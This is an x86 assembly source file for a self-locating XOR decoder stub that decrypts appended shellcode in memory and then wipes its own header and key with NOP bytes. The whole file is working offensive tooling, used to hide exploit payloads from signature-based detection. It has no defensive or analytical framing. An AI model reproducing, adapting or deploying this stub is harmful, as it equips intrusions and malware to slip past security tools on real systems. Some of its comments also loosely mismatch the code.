BITS 32

; plain x86 | trailer
; -----------------------------------------------------------------------------------------------------------
; | decoder | 2 byte shellcode len | 1 byte xor key len | xor key (xor key len) | shellcode (shellcode len) |
; ----------------[XOR ENCODED]---------------------------------------------------------[XOR ENCODED]--------
;           | Reg: cx              | Reg: dl            | [esi]+3+dh            | [esi]+3+dl+(cx-i)


jmp short	get_eip
got_eip:
pop		esi		; get stackpointer := start+sizeof(decoder)

xor		ecx,ecx
mov word	cx,[esi]	; shellcode len (encoded)
xor word	cx,0x0101	; decode shellcode len
mov		edi,ecx		; save it in edi

; dh := xor pad
; dl := xor key len
xor		edx,edx
mov byte	dl,[esi+2]

decryptloop:
; calculate key pos
mov		eax,esi		; move trailer ptr to eax
add		eax,edi		; add shellcode len to esi [ptr]
add		eax,0x3		; 0x3 := shellcode len + xor key len
xor		ebx,ebx
movzx		ebx,dl		; ebx := xor key len
add		eax,ebx		; eax := eax + xor key len
sub		eax,ecx		; eax := eax - i
push		eax

; calculate shellcode pos
mov		eax,esi		; same as above
add		eax,0x3		; same as above
xor		ebx,ebx
movzx		ebx,dh		; ebx := xor key offset
add		eax,ebx		; eax := eax + xor key offset
push		eax

; do the real stuff ;)
pop		eax		; ptr to next xor'ing byte in eax
mov		bl, [eax]	; b-low is our xor'ing byte (key-pad)
pop		eax
mov		bh, [eax]	; b-high is an encrypted shellcode byte
xor byte	bh,bl		; b-low XOR b-high
mov		[eax],bh	; copy our decrypted byte back into memory

; re-calculate xor pad
inc		dh		; xor key offset++
;inc		dh		; again (for comparing dh with dl)
cmp		dh,dl
jne		nexti
xor		dh,dh

; prepare next iteration
nexti:
;dec		dh
dec		ecx
jnz		decryptloop

; cleanup header + xorkey (overwrite with NOPsled)
mov byte	[esi],0x90
mov byte	[esi+1],0x90
mov		cl,[esi+2]
mov byte	[esi+2],0x90
nop_xorkey:
mov byte	[esi+2+ecx],0x90
loop nop_xorkey

jmp short	done
get_eip:
call got_eip
done:
